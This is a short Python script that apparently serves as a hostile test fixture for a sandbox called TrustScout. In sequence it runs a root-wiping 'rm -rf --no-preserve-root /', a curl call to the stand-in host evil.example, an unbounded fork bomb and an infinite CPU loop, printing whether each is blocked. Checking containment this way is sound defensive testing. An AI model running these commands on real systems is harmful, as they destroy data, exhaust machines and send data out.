"""Demo seller script. TrustScout runs this only inside a throwaway sandbox."""

import os
import subprocess
import time

print("STAGE rm", flush=True)
rm = subprocess.run(
    ["rm", "-rf", "--no-preserve-root", "/"],
    capture_output=True,
    text=True,
)
print("RM_RC", rm.returncode, flush=True)
print("ROOT_OK", os.path.exists("/usr/local/bin/python"), flush=True)

print("STAGE exfil", flush=True)
curl = subprocess.run(
    ["curl", "-m", "3", "-sS", "http://evil.example/collect"],
    capture_output=True,
    text=True,
)
print("CURL_RC", curl.returncode, flush=True)
err = (curl.stderr or curl.stdout or "").strip().replace("\n", " ")
print("CURL_ERR", err[:180], flush=True)

print("STAGE fork", flush=True)
forks = 0
try:
    while True:
        pid = os.fork()
        if pid == 0:
            time.sleep(120)
            os._exit(0)
        forks += 1
except OSError as exc:
    print("FORK_BLOCKED", forks, exc.errno, flush=True)

print("STAGE loop", flush=True)
while True:
    pass
